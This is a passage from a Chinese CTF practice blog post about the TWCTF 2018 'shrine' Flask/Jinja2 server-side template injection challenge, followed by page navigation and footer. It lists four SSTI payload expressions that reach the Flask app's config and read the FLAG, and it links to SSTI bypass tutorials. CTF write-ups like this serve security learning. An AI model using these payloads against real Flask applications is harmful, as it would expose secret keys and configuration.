<p><a href="https://gitlab.com/mahham/ctf/blob/master/2018-twctf/Readme.md#shrine-190-web" target="_blank" rel="noopener">官网writeup</a></p>
<p>这篇<code>writeup</code>总结的特别好</p>
<p>对于这种情况一般只有内置函数才能解决</p>
<p>对<code>SSTI</code>不是很了解，尤其内置类，所以这就先不分析了，找个时间专门学习一下</p>
<ul>
<li><code>get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code></li>
<li><code>url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code></li>
<li><code>g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config</code></li>
<li><code>app.__init__.__globals__.sys.modules.app.app.__dict__</code></li>
</ul>
<p>以上都可以读到<code>flag</code></p>
<p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p>
<p><a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener">Python模板注入(SSTI)深入学习</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/11656544.html" target="_blank" rel="noopener">python-Flask模版注入攻击SSTI(python沙盒逃逸)</a></p>
<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></p>
<p><a href="https://www.jianshu.com/p/fea23f17d497" target="_blank" rel="noopener">SSTI bypass 总结</a></p>
<p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">探索Flask/Jinja2中的服务端模版注入（二）</a></p>
<p><a href="[https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/](https://evi0s.com/2018/11/26/深入ssti-从nctf2018两道flask看bypass新姿势/)">深入SSTI-从NCTF2018两道Flask看bypass新姿势</a></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">A2u13</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/">https://a2u13.com/2020/02/15/BUUCTF刷题笔记（四）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://a2u13.com" target="_blank">A2u13's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222936.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"><img class="prev_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF刷题笔记（五）</div></div></a></div><div class="next-post pull_right"><a href="/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"><img class="next_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF刷题笔记（三）</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（一）/" title="BUUCTF刷题笔记（一）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（一）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/13/BUUCTF刷题笔记（三）/" title="BUUCTF刷题笔记（三）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-13</div><div class="relatedPosts_title">BUUCTF刷题笔记（三）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/17/BUUCTF刷题笔记（五）/" title="BUUCTF刷题笔记（五）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-17</div><div class="relatedPosts_title">BUUCTF刷题笔记（五）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（二）/" title="BUUCTF刷题笔记（二）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（二）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/28/BUUCTF刷题笔记（六）/" title="BUUCTF刷题笔记（六）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-28</div><div class="relatedPosts_title">BUUCTF刷题笔记（六）</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By A2u13</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
      pangu.spacingElementById('content-inner')
})</script><script src="/js/search/local-search.js"></script></body></html>